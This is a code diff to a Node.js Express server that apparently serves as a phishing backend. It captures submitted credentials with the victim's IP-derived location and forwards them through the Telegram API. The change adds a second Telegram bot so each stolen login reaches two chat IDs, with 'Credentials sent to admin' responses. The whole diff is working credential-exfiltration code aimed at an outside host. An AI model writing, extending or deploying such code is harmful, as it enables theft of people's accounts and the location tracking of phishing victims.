@@ -13,24 +13,52 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Telegram Bot Configuration
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// Telegram Bot Configurations - Two separate bots
+const TELEGRAM_BOT_1 = {
+    token: process.env.TELEGRAM_BOT_TOKEN_1,
+    chatId: process.env.TELEGRAM_CHAT_ID_1
+};
 
-// Function to send message to Telegram
-const sendToTelegram = async (message) => {
+const TELEGRAM_BOT_2 = {
+    token: process.env.TELEGRAM_BOT_TOKEN_2,
+    chatId: process.env.TELEGRAM_CHAT_ID_2
+};
+
+// Array of all bot configurations
+const TELEGRAM_BOTS = [TELEGRAM_BOT_1, TELEGRAM_BOT_2];
+
+// Function to send message to a single Telegram bot
+const sendToSingleTelegram = async (botConfig, message) => {
     try {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const url = `https://api.telegram.org/bot${botConfig.token}/sendMessage`;
         const response = await axios.post(url, {
-            chat_id: TELEGRAM_CHAT_ID,    
+            chat_id: botConfig.chatId,
             text: message,
             parse_mode: 'HTML' // Allows HTML formatting
         });
-        return response.data;
+        return { success: true, bot: botConfig.chatId, data: response.data };
     } catch (error) {
-        console.error('Error sending to Telegram:', error.response?.data || error.message);
-        throw error;
+        console.error(`Error sending to Telegram bot (${botConfig.chatId}):`, error.response?.data || error.message);
+        return { success: false, bot: botConfig.chatId, error: error.response?.data || error.message };
     }
+};
+
+// Function to send message to ALL Telegram bots simultaneously
+const sendToAllTelegramBots = async (message) => {
+    const results = await Promise.allSettled(
+        TELEGRAM_BOTS.map(bot => sendToSingleTelegram(bot, message))
+    );
+    
+    // Log results
+    results.forEach((result, index) => {
+        if (result.status === 'fulfilled') {
+            console.log(`Bot ${index + 1} result:`, result.value);
+        } else {
+            console.error(`Bot ${index + 1} failed:`, result.reason);
+        }
+    });
+
+    return results;
 };
 
 // Function to get location from IP
@@ -94,9 +122,17 @@ ${locationDetails}
     `.trim();
 
     try {
-        const response = await sendToTelegram(telegramMessage);
-        console.log('Telegram message sent:', response);
-        res.status(200).json({ message: "Credentials sent to admin" });
+        const results = await sendToAllTelegramBots(telegramMessage);
+        
+        // Check if at least one bot succeeded
+        const anySuccess = results.some(r => r.status === 'fulfilled' && r.value.success);
+        
+        if (anySuccess) {
+            console.log('Telegram messages sent to available bots');
+            res.status(200).json({ message: "Credentials sent to admin" });
+        } else {
+            throw new Error('All Telegram bots failed to send message');
+        }
     } catch (error) {
         console.error('Error sending to Telegram:', error);
         res.status(500).json({ message: "Failed to send credentials to admin" });
